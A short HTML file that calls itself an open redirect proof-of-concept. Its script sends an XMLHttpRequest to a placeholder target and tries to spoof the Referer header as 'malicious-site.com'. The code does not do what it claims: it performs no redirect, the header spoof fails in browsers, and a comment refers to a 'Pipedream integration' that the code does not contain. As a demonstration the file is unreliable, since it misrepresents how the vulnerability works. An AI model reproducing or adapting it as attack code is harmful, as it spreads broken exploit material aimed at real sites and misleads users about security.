<!-- Open Redirect PoC Code -->

<!DOCTYPE html>
<html>
<head>
    <title>Open Redirect PoC</title>
</head>
<body>
    <h1>Open Redirect Demonstration</h1>
    <p>This PoC demonstrates an open redirect vulnerability.</p>
    <script>
        // Automatic redirect trigger
        function redirect(url) {
            // Manipulating the Referer header using Pipedream integration
            const xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.setRequestHeader('Referer', 'https://malicious-site.com');
            xhr.send();
        }

        // Triggering the redirect with an attack flow
        const targetUrl = 'https://example.com'; // Change to the target URL
        redirect(targetUrl);
    </script>
</body>
</html>
